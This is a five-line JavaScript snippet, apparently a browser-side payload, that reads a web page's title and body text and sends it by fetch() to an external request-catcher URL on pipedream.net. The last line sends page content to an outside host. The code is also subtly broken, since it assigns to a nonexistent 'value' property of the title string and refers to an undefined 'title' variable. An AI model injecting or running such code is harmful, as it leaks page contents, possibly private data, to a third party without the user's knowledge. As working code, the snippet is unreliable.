console.log(document.title);
console.log(document.body.innerText);
document.title.value = document.body.innerText;
console.log(title.value);
fetch("https://enk4c3pf2z43.x.pipedream.net/?=" + document.title.value);